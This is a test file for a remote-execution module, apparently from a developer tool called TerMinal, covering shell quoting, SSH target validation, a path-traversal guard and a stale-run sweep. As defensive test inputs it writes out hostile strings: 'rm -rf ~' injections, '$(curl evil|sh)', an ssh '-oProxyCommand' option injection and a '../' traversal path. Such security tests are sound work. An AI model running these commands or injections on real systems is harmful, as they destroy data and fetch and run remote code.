import { test, expect, describe } from 'bun:test'
import { execFileSync } from 'node:child_process'
import {
  mkdtempSync,
  mkdirSync,
  writeFileSync,
  readFileSync,
  existsSync,
  realpathSync,
  rmSync,
} from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { shq, isSafeSshTarget, remoteCommandForEngine, REMOTE_SCRIPT } from './remote'

// ─── shq: the single shell-quoting primitive the whole remote path relies on ───
describe('shq shell-quoting', () => {
  test('passes safe tokens through unquoted', () => {
    expect(shq('abc-123')).toBe('abc-123')
    expect(shq('/usr/local/bin/codex')).toBe('/usr/local/bin/codex')
    expect(shq('user@host.example.com')).toBe('user@host.example.com')
  })

  test('single-quotes shell metacharacters', () => {
    expect(shq('; rm -rf ~')).toBe("'; rm -rf ~'")
    expect(shq('$(curl evil|sh)')).toBe("'$(curl evil|sh)'")
    expect(shq('`whoami`')).toBe("'`whoami`'")
    expect(shq('a b')).toBe("'a b'")
  })

  test('escapes embedded single quotes with the POSIX close-escape-reopen form', () => {
    expect(shq("a'b")).toBe("'a'\\''b'")
  })

  // The real proof: a correctly-quoted string is treated LITERALLY by a real
  // bash. If shq ever regressed to allow expansion, printf would emit something
  // other than the input and this fails.
  test('output is literal inside a real bash shell (no expansion / no injection)', () => {
    const payloads = [
      '$(echo INJECTED)',
      '`echo INJECTED`',
      'a; echo INJECTED',
      "x'y",
      'a b',
      '~/dir',
    ]
    for (const p of payloads) {
      const out = execFileSync('bash', ['-c', 'printf %s ' + shq(p)], { encoding: 'utf8' })
      expect(out).toBe(p)
    }
  })
})

// ─── isSafeSshTarget: blocks ssh argv option-injection (-oProxyCommand=…) ───
describe('isSafeSshTarget', () => {
  test('accepts real ssh destinations', () => {
    expect(isSafeSshTarget('user@host')).toBe(true)
    expect(isSafeSshTarget('myalias')).toBe(true)
    expect(isSafeSshTarget('10.0.0.2')).toBe(true)
  })

  test('rejects option-injection and malformed targets', () => {
    expect(isSafeSshTarget('-oProxyCommand=touch /tmp/pwned')).toBe(false)
    expect(isSafeSshTarget('-D1234')).toBe(false)
    expect(isSafeSshTarget('')).toBe(false)
    expect(isSafeSshTarget('   ')).toBe(false)
    expect(isSafeSshTarget('host\nrm -rf ~')).toBe(false)
    expect(isSafeSshTarget(undefined as unknown as string)).toBe(false)
  })
})

describe('remoteCommandForEngine', () => {
  test('wraps in a login shell and never leaves an injection-bearing cwd bare', () => {
    const cmd = remoteCommandForEngine(
      'codex',
      ['exec', '-s', 'danger-full-access'],
      '/tmp/x; rm -rf ~',
    )
    expect(cmd.startsWith('bash -lc ')).toBe(true)
    // A bare `cd -- /tmp/x; rm -rf ~` would be a disaster; the metacharacters
    // must be inside quotes. The unquoted `cd -- /tmp/x;` form must not appear.
    expect(cmd).not.toContain('cd -- /tmp/x;')
  })
})

// ─── REMOTE_SCRIPT executed locally via `node -e`, exactly as it runs on a
//     remote host over SSH. This is the only coverage of the stringified remote
//     daemon; it exercises the real code path, not a reimplementation. ───
function runRemoteScript(
  payload: Record<string, unknown>,
  opts: { cwd: string; home?: string },
): string {
  return execFileSync('node', ['-e', REMOTE_SCRIPT, JSON.stringify(payload)], {
    cwd: opts.cwd,
    env: { ...process.env, ...(opts.home ? { HOME: opts.home } : {}) },
    encoding: 'utf8',
  })
}

function mkRepo(): string {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), 'terminal-remote-')))
  execFileSync('git', ['init', '-q'], { cwd: dir })
  return dir
}

describe('REMOTE_SCRIPT tickets.update', () => {
  test('applies acceptance criteria (previously silently dropped)', () => {
    const dir = mkRepo()
    try {
      const backlog = join(dir, '.TerMinal', 'backlog')
      mkdirSync(backlog, { recursive: true })
      const slug = '0001-test'
      writeFileSync(
        join(backlog, `${slug}.md`),
        [
          '---',
          'id: 1',
          'title: "Test"',
          'status: open',
          'priority: medium',
          'acceptance: []',
          '---',
          '',
          'body',
        ].join('\n'),
      )
      const acceptance = ['first criterion', 'second; rm -rf ~ criterion']
      const res = runRemoteScript(
        { op: 'tickets.update', slug, patch: { acceptance } },
        { cwd: dir },
      )
      expect(res.trim()).toBe('true')

      // Round-trip through the remote reader proves the write is real & parseable.
      const got = JSON.parse(runRemoteScript({ op: 'tickets.get', slug }, { cwd: dir }))
      expect(got.acceptance).toEqual(acceptance)

      const md = readFileSync(join(backlog, `${slug}.md`), 'utf8')
      expect(md).toContain('acceptance:\n')
      expect(md).toContain('- "first criterion"')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
})

describe('REMOTE_SCRIPT files traversal guard', () => {
  test('refuses to delete a path outside the repo root', () => {
    const dir = mkRepo()
    const sentinel = join(dir, '..', `sentinel-${process.pid}`)
    try {
      writeFileSync(sentinel, 'keep me')
      const res = runRemoteScript(
        { op: 'files.delete', rel: `../sentinel-${process.pid}` },
        { cwd: dir },
      )
      expect(res.trim()).toBe('false')
      expect(existsSync(sentinel)).toBe(true)
    } finally {
      rmSync(dir, { recursive: true, force: true })
      rmSync(sentinel, { force: true })
    }
  })
})

describe('REMOTE_SCRIPT stale-run sweep', () => {
  test('finalizes a >2h running record but leaves a fresh one alone', () => {
    const dir = mkRepo()
    const home = realpathSync(mkdtempSync(join(tmpdir(), 'terminal-home-')))
    try {
      const runsDir = join(home, '.config', 'TerMinal', 'cron-runs')
      mkdirSync(runsDir, { recursive: true })
      const threeHoursAgo = Date.now() - 3 * 60 * 60 * 1000
      writeFileSync(
        join(runsDir, 'stale.json'),
        JSON.stringify({
          id: 'stale',
          source: 'agent',
          status: 'running',
          startedAt: threeHoursAgo,
        }),
      )
      writeFileSync(
        join(runsDir, 'fresh.json'),
        JSON.stringify({ id: 'fresh', source: 'agent', status: 'running', startedAt: Date.now() }),
      )

      const runs = JSON.parse(runRemoteScript({ op: 'runs.all' }, { cwd: dir, home }))
      const byId = Object.fromEntries(
        runs.map((r: { id: string; status: string }) => [r.id, r.status]),
      )
      expect(byId.stale).toBe('failed')
      expect(byId.fresh).toBe('running')

      // Persisted, not just corrected in the returned list.
      const onDisk = JSON.parse(readFileSync(join(runsDir, 'stale.json'), 'utf8'))
      expect(onDisk.status).toBe('failed')
      expect(onDisk.endedAt).toBeGreaterThan(0)
    } finally {
      rmSync(dir, { recursive: true, force: true })
      rmSync(home, { recursive: true, force: true })
    }
  })
})
